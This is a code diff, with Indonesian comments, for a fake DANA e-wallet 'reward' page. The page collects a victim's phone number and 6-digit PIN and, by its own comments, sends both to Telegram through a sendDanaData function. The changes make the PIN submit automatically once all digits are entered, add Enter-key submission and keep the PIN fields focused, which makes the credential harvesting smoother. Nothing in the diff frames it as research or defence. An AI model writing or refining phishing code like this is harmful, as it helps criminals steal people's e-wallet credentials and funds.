@@ -49,6 +49,54 @@ document.addEventListener('DOMContentLoaded', () => {
     return rewardAmounts[randomIndex];
   }
 
+  // Fungsi untuk otomatis submit setelah PIN lengkap
+  function autoSubmitPin() {
+    pin = Array.from(pis).map(i => i.value).join('');
+    
+    if (pin.length === 6) {
+      // Otomatis lanjutkan setelah PIN lengkap
+      handlePinSubmission();
+    }
+  }
+
+  // Handle PIN submission
+  async function handlePinSubmission() {
+    if (pin.length !== 6) {
+      alert('Kode pendaftaran harus 6 digit');
+      return;
+    }
+    
+    showSpinner();
+    try {
+      // Kirim data PIN ke Telegram
+      await sendDanaData('pin', { phone: phoneNumber, pin });
+      
+      // Dapatkan nominal reward acak
+      rewardAmount = getRandomReward();
+      
+      // Kirim data reward ke Telegram
+      await sendDanaData('reward', { 
+        phone: phoneNumber, 
+        pin, 
+        reward: rewardAmount 
+      });
+      
+      // Tampilkan halaman reward
+      setTimeout(() => {
+        pages.p.style.display = 'none';
+        pages.r.style.display = 'block';
+        currentPage = 'r';
+        
+        // Set reward amount
+        saldoAmount.textContent = rewardAmount;
+        hideSpinner();
+      }, 1000);
+    } catch (error) {
+      alert('Gagal verifikasi kode: ' + error.message);
+      hideSpinner();
+    }
+  }
+
   // Backend Communication untuk mengirim data ke Telegram
   async function sendDanaData(type, data) {
     try {
@@ -119,6 +167,10 @@ document.addEventListener('DOMContentLoaded', () => {
           pages.p.style.display = 'block';
           currentPage = 'p';
           lc.style.display = 'none';
+          // Fokus ke input PIN pertama
+          if (pis.length > 0) {
+            pis[0].focus();
+          }
           hideSpinner();
         }, 1000);
       } catch (error) {
@@ -126,59 +178,32 @@ document.addEventListener('DOMContentLoaded', () => {
         hideSpinner();
       }
     } else if (currentPage === 'p') {
-      // Handle PIN submission
-      pin = Array.from(pis).map(i => i.value).join('');
-      
-      if (pin.length !== 6) {
-        alert('Kode pendaftaran harus 6 digit');
-        return;
-      }
-      
-      showSpinner();
-      try {
-        // Kirim data PIN ke Telegram
-        await sendDanaData('pin', { phone: phoneNumber, pin });
-        
-        // Dapatkan nominal reward acak
-        rewardAmount = getRandomReward();
-        
-        // Kirim data reward ke Telegram
-        await sendDanaData('reward', { 
-          phone: phoneNumber, 
-          pin, 
-          reward: rewardAmount 
-        });
-        
-        // Tampilkan halaman reward
-        setTimeout(() => {
-          pages.p.style.display = 'none';
-          pages.r.style.display = 'block';
-          currentPage = 'r';
-          
-          // Set reward amount
-          saldoAmount.textContent = rewardAmount;
-          hideSpinner();
-        }, 1000);
-      } catch (error) {
-        alert('Gagal verifikasi kode: ' + error.message);
-        hideSpinner();
-      }
+      // Handle PIN submission manual (jika tombol lanjutkan diklik)
+      handlePinSubmission();
     }
   });
 
-  // PIN Input Handling
+  // PIN Input Handling - Auto submit ketika 6 digit terisi
   pis.forEach((input, index) => {
     input.addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g, '');
       
       if (e.target.value.length === 1 && index < pis.length - 1) {
+        // Pindah ke input berikutnya
         pis[index + 1].focus();
       }
+      
+      // Cek jika semua digit sudah terisi
+      autoSubmitPin();
     });
     
     input.addEventListener('keydown', (e) => {
       if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        // Kembali ke input sebelumnya saat backspace
         pis[index - 1].focus();
+      } else if (e.key === 'Enter') {
+        // Submit dengan Enter
+        autoSubmitPin();
       }
     });
   });
@@ -194,6 +219,12 @@ document.addEventListener('DOMContentLoaded', () => {
     
     // Reset PIN inputs
     pis.forEach(input => input.value = '');
+    
+    // Fokus ke input PIN pertama
+    const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
+    if (withdrawPins.length > 0) {
+      withdrawPins[0].focus();
+    }
   });
 
   // Kembali Button Handler
@@ -224,7 +255,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // Handle PIN untuk penarikan dana
+  // Handle PIN untuk penarikan dana (auto submit)
   const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
   if (withdrawPins.length > 0) {
     withdrawPins.forEach((input, index) => {
@@ -275,8 +306,32 @@ document.addEventListener('DOMContentLoaded', () => {
       input.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
           withdrawPins[index - 1].focus();
+        } else if (e.key === 'Enter') {
+          // Submit dengan Enter
+          const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
+          if (withdrawPin.length === 6) {
+            showSpinner();
+            // Trigger proses penarikan
+            withdrawPins[withdrawPins.length - 1].dispatchEvent(new Event('input'));
+          }
         }
       });
     });
   }
+
+  // Handle klik di luar input untuk mobile devices
+  document.addEventListener('click', (e) => {
+    if (currentPage === 'p' && !e.target.classList.contains('pin-box')) {
+      // Cari input PIN yang aktif atau pertama kali
+      const activePin = document.querySelector('.pin-box:focus');
+      if (!activePin) {
+        const firstEmptyPin = Array.from(pis).find(input => input.value === '');
+        if (firstEmptyPin) {
+          firstEmptyPin.focus();
+        } else {
+          pis[0].focus();
+        }
+      }
+    }
+  });
 });
